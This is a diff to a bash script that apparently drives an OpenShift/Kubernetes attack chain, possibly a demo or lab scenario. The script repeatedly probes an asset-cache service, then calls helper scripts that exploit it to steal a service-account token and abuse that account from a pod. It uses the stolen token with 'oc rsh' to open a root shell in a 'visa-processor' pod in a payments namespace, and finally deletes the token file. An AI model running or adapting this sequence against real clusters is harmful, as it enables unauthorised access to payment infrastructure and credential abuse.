@@ -2,7 +2,23 @@
 
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]:-$0}" )" && pwd )"
 
-$DIR/00_interactive_asset-cache.sh --check
+sleep 60
+
+### Pre-requisites - Get Visa ServiceAccount Token
+$DIR/00_interactive_asset-cache.sh --ua curl --check
+sleep 2
+$DIR/00_interactive_asset-cache.sh --ua curl --check
+sleep 2
+$DIR/00_interactive_asset-cache.sh --ua curl --check
+sleep 2
+$DIR/00_interactive_asset-cache.sh --ua curl --check
+sleep 2
+$DIR/00_interactive_asset-cache.sh --ua curl --check
+sleep 2
+$DIR/00_interactive_asset-cache.sh --ua curl --check
+sleep 2
+$DIR/00_interactive_asset-cache.sh --ua curl --check
+sleep 2
 $DIR/01_expoit_asset-cache_get_visa_token.sh
 $DIR/02_abuse_visa_serviceaccount_kubectl_from_pod.sh
 
@@ -26,3 +42,5 @@ oc --token $(cat token) wait --for=condition=Ready pod/visa-processor -n payment
 
 # 4. Access the root shell
 oc --token $(cat token) -n payments-v2 rsh visa-processor
+
+rm token
